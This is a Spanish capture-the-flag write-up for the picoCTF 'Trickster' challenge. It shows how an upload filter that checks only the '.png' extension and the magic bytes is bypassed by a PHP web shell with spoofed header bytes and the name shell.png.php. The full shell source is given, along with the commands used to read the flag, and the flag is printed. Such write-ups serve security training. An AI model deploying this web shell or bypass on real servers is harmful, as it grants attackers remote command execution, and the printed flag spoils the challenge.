# Trickster

## Descripcion

## Solucion
Vemos un sitio en el cual podemos subir archivos png, probamos a subir un archivo, pero relamente no pasa nada. 
Revisamos los robots.txt y encontramos algo muy interesante:

```robots.txt
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

Entonces vamos a ver que esta en el archivo instructions.txt
Vemos que para saber si algo es una imagen, solo se verifican los magic bytes, entonces podemos subir cualquier archivo, incluso archivos que no sean png siempre y cuando los alteremos

```Instrucciones
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

Entonces, vemos que el sitio solo esta validando que el archivo sea png, para lo cual, vamos a cambiar los magic bytes de un archivo para hacerlo pasar como png y puesto que tambien verifica el nombre, lo renombraremos, el archivo que voy a usar es una shell de php:
```php 
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>

```

Con una herramienta como hexedit, edito los bytes:
```
00000000   50 4E 47 6D  6C 3E 0A 3C  62 6F 64 79  3E 0A 3C 66  6F 72 6D 20  6D 65 74 68  6F 64 3D 22  PNG
```
Y lo renombro como: shell.png.php
Lo subimos y despues nos vamos a buscarlo a la carpeta `/uploads`
Asi conseguimos una web shell para ejecutar comandos, asi que vamos buscando la bandera:
```sh
pwd
ls ../
#GQ4DOOBVMMYGK.txt
#index.php
#instructions.txt
#robots.txt
#uploads
cat ../GQ4DOOBVMMYGK.txt
#/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e} */
```

Y asi encontramos la flag:
```flag
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}
```
## Notas adicionales

## Referencias
